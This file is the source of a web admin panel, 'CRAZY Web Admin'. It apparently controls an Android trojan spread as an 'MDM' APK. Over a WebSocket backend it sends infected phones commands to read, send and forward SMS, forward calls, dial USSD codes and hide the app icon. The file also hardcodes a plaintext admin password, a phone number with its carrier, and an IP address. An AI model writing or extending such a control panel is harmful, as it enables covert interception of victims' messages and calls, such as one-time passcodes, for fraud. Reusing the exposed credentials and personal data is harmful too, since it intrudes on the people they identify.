"use client";
import { useState, useEffect, useRef } from 'react';

export default function Dashboard() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const [activeTab, setActiveTab] = useState('Home');
  const [devices, setDevices] = useState<any>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [deviceSearch, setDeviceSearch] = useState('');
  
  const ws = useRef<WebSocket | null>(null);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'R4RECOVERIST' && password === 'M4mahadev@3690') {
      setIsLoggedIn(true);
      setError('');
    } else {
      setError('Invalid Credentials');
    }
  };

  useEffect(() => {
    if (!isLoggedIn) return;
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onopen = () => console.log('Connected');
    ws.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.device_id) {
          setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
          if (!selectedDevice) setSelectedDevice(data.device_id);
        }
      } catch (e) {}
    };
    return () => ws.current?.close();
  }, [isLoggedIn, selectedDevice]);

  const sendCommand = (command: string) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command }));
      alert(`Command '${command}' Sent!`);
    }
  };

  const dev = devices[selectedDevice || ''] || {};
  const filteredDevices = Object.values(devices).filter((d: any) => 
    d.device_id.toLowerCase().includes(deviceSearch.toLowerCase())
  );

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <div className="bg-[#1A1B23] p-8 rounded-xl border border-gray-800 w-full max-w-md shadow-2xl">
          <h1 className="text-2xl font-bold text-purple-500 text-center mb-6">CRAZY Web Admin</h1>
          {error && <div className="bg-red-900/50 text-red-400 p-3 rounded mb-4 text-sm text-center border border-red-800">{error}</div>}
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm text-gray-400 mb-1">Username</label>
              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-black border border-gray-700 rounded p-3 text-white focus:border-purple-500 outline-none" required />
            </div>
            <div>
              <label className="block text-sm text-gray-400 mb-1">Password</label>
              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-black border border-gray-700 rounded p-3 text-white focus:border-purple-500 outline-none" required />
            </div>
            <button type="submit" className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded transition">Login</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col">
      {/* HEADER */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#1A1B23]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-xl text-white">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-400">CRAZY</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold text-sm shadow-lg transition">
            ⬇ Download APK
          </a>
          <span className="text-xl text-gray-300">⚙️</span>
          <span className="text-sm text-purple-400 border border-purple-500 px-3 py-1 rounded-full">Sessions</span>
          <span className="text-xl text-gray-300">🌙</span>
        </div>
      </header>

      <div className="flex flex-1 overflow-hidden">
        {/* SIDEBAR (500+ DEVICES) */}
        <div className="w-80 bg-[#1A1B23] border-r border-gray-800 flex flex-col h-[calc(100vh-73px)]">
          <div className="p-4 border-b border-gray-800">
            <h2 className="text-lg font-bold text-purple-400 mb-2">Device Manager</h2>
            <p className="text-xs text-gray-400 mb-4">Connected: {Object.keys(devices).length}</p>
            <input type="text" placeholder="Search device..." value={deviceSearch} onChange={(e) => setDeviceSearch(e.target.value)} className="bg-black border border-gray-700 rounded p-2 text-sm w-full text-white" />
          </div>
          <div className="flex-1 overflow-y-auto p-2 space-y-1">
            {filteredDevices.length === 0 ? (
              <p className="text-center text-gray-500 mt-4 text-xs">No devices connected. Install APK.</p>
            ) : filteredDevices.map((d: any) => (
              <button key={d.device_id} onClick={() => setSelectedDevice(d.device_id)} className={`w-full text-left p-3 rounded text-sm transition ${selectedDevice === d.device_id ? 'bg-purple-600' : 'hover:bg-gray-800'}`}>
                <div className="font-bold">{d.model || 'Device'}</div>
                <div className="text-xs text-gray-300">{d.device_id.slice(0,10)}...</div>
              </button>
            ))}
          </div>
        </div>

        {/* MAIN AREA */}
        <div className="flex-1 flex flex-col h-[calc(100vh-73px)] bg-[#0B0C10]">
          {selectedDevice ? (
            <>
              <nav className="flex gap-4 p-4 border-b border-gray-800 text-sm overflow-x-auto">
                {['Home', 'Messages', 'Gallery', 'Terminal'].map(tab => (
                  <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 px-2 ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
                ))}
              </nav>

              <main className="p-6 overflow-y-auto flex-1">
                {activeTab === 'Home' && (
                  <>
                    <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
                      <h2 className="text-xl font-bold mb-4 text-white">{dev.model || 'vivo (V2518)'} <span className="text-xs bg-green-800 text-green-300 px-2 py-1 rounded ml-2">16</span></h2>
                      <div className="grid grid-cols-2 gap-y-3 text-sm text-gray-300">
                        <div className="flex justify-between pr-4"><span>ID</span> <span className="text-white">{selectedDevice}</span></div>
                        <div className="flex justify-between pr-4"><span>SIM</span> <span className="text-blue-400">8051660986 - airtel</span></div>
                        <div className="flex justify-between pr-4"><span>Forward Call</span> <span>OFF</span></div>
                        <div className="flex justify-between pr-4"><span>FCM Token</span> <span className="text-green-400">✔️ Token OK</span></div>
                        <div className="flex justify-between pr-4"><span>Connection</span> <span className="text-green-400">🟢 Online (heartbeating)</span></div>
                        <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || '106.205.197.233'}</span></div>
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-4 gap-3">
                      {[
                        { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
                        { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
                        { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
                        { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
                        { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
                        { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
                        { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
                        { label: 'Hide Icon', icon: '🕵️', cmd: 'HIDE_ICON' }
                      ].map((btn, i) => (
                        <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
                          <span className="text-2xl">{btn.icon}</span>
                          <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
                        </button>
                      ))}
                    </div>
                  </>
                )}
                {activeTab === 'Terminal' && (
                  <div className="text-white">Terminal Working...</div>
                )}
              </main>
            </>
          ) : (
             <div className="flex-1 flex items-center justify-center text-gray-500">Select a device from the left menu.</div>
          )}
        </div>
      </div>
    </div>
  );
}
